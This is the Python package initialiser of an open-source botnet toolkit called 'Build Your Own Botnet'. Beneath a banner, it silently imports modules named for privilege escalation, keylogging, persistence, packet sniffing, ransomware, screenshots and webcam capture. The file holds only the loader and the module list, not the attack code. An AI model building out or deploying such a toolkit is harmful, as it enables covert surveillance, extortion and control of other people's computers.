#!/usr/bin/python
# Build Your Own Botnet
# https://github.com/colental/byob
# Copyright (c) 2018 Daniel Vega-Myhre
"""

88                                  88
88                                  88
88                                  88
88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
88       d8  `8b   d8'  8b       d8 88       d8
88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
                d8'
               d8'

"""

def __init__():
    for module in __all__:
        try:
            exec "import {}".format(module) in globals()
        except:
            pass

__all__         = ['escalate', 'importer', 'keylogger', 'outlook', 'packetsniffer', 'persistence', 'phone', 'portscan', 'process', 'ransom', 'screenshot', 'security', 'util', 'webcam']
__author__      = 'Daniel Vega-Myhre'
__license__ 	= 'GPLv3'
__version__ 	= '0.1.2'
__init__()
